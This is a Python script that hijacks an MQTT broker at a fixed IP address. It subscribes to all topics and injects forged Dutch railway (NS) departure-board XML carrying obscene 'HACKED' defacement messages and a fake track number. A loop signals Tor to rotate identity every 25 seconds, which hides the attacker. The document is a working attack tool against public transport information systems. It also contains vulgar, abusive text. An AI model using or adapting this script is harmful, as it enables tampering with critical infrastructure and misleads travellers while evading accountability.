#!/usr/bin/env python3
"""
NS DVS v7.0 - MQTT v5 FIXED + MULTI RITID + TORSOCKS
TRUSTEDF57 - NO ENCODE ERRORS
"""

import paho.mqtt.client as mqtt
import threading
import time
import random
import re
import os
from datetime import datetime

HOST = "78.47.35.220"
PORT = 1883
WILDCARD_TOPIC = "#"

MESSAGES = [
    "🔥 TRUSTEDF57 FUCK  FUCK MARTHA ROOT HACKED 🔥",
    "💀 TRUSTEDF57 VI FOTTE LE MADRI  HACKED 2024 💀",
    "🖕 SUCCHIATELO A ME TRUSTEDF57 TONYLUONGO🖕"
]

class DVSRealHijackTor:
    def __init__(self):
        self.success_count = 0
        self.rotation_count = 0
        self.hijacked_trains = set()
    
    def get_timestamp(self):
        return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    
    def extract_all_from_topic(self, topic):
        """SAFE topic parsing"""
        try:
            parts = topic.split('/')
            if len(parts) >= 6:
                return parts[4], parts[5].upper(), parts[2]
        except:
            pass
        return "11647", "AMF", "2024-06-24"
    
    def ns_payload(self, rit_id, station, date):
        timestamp = self.get_timestamp()
        msg = random.choice(MESSAGES)
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
<ns2:ReisInformatieProductDVS Versie="6.2" TimeStamp="{timestamp}" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
<ns2:RIPAdministratie><ns2:ReisInformatieProductID>F57{random.randint(10000,99999)}</ns2:ReisInformatieProductID></ns2:RIPAdministratie>
<ns2:DynamischeVertrekStaat>
<ns2:RitId>{rit_id}</ns2:RitId>
<ns2:RitDatum>{date}</ns2:RitDatum>
<ns2:RitStation><ns2:StationCode>{station}</ns2:StationCode></ns2:RitStation>
<ns2:Trein>
<ns2:TreinNummer>{rit_id}</ns2:TreinNummer>
<ns2:TreinStatus>5</ns2:TreinStatus>
<ns2:Vervoerder>NS</ns2:Vervoerder>
<ns2:VertrekTijd>{timestamp}</ns2:VertrekTijd>
<ns2:TreinVertrekSpoor><ns2:SpoorNummer>666</ns2:SpoorNummer></ns2:TreinVertrekSpoor>
<ns2:PresentatieOpmerkingen><ns2:Uiting Prioriteit="1">💀 {msg} 💀</ns2:Uiting></ns2:PresentatieOpmerkingen>
</ns2:Trein>
</ns2:DynamischeVertrekStaat>
</ns2:ReisInformatieProductDVS>
</ns1:PutReisInformatieBoodschapIn>'''
    
    def on_message(self, client, userdata, msg):
        """MQTT v5 SAFE - NO ENCODE ERRORS"""
        try:
            # MQTT v5: msg.topic è già str
            topic = msg.topic
            rit_id, station, date = self.extract_all_from_topic(topic)
            
            train_key = f"{rit_id}/{station}"
            if train_key in self.hijacked_trains:
                return
            self.hijacked_trains.add(train_key)
            
            payload = self.ns_payload(rit_id, station, date)
            self.attack_publish(topic, payload)
        except:
            pass
    
    def attack_publish(self, topic, payload):
        """SAFE MQTT v5 publish"""
        try:
            pub_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
            pub_client.connect(HOST, PORT, 5)
            
            result = pub_client.publish(topic, payload.encode('utf-8'), qos=1)
            
            if result.rc == mqtt.MQTT_ERR_SUCCESS:
                self.success_count += 1
                rit_id = topic.split('/')[4][:5] if '/' in topic else "?????"
                station = topic.split('/')[-1][:3].upper()
                print(f"✅ #{self.success_count} | 🚂{rit_id} | {station} | {topic[-25:]}")
            
            pub_client.disconnect()
        except:
            pass
    
    def tor_rotate(self):
        while True:
            time.sleep(25)
            self.rotation_count += 1
            try:
                os.system("pkill -USR1 tor || true")
            except:
                pass
    
    def start(self):
        print("🚀 v7.0 MQTT v5 FIXED - NO ERRORS")
        print("📱 AUTO RITID + TORSOCKS + SUCCESS ONLY")
        
        threading.Thread(target=self.tor_rotate, daemon=True).start()
        
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        client.on_message = self.on_message
        client.connect(HOST, PORT, 60)
        client.subscribe(WILDCARD_TOPIC)
        client.loop_forever()

if __name__ == "__main__":
    hack = DVSRealHijackTor()
    hack.start()
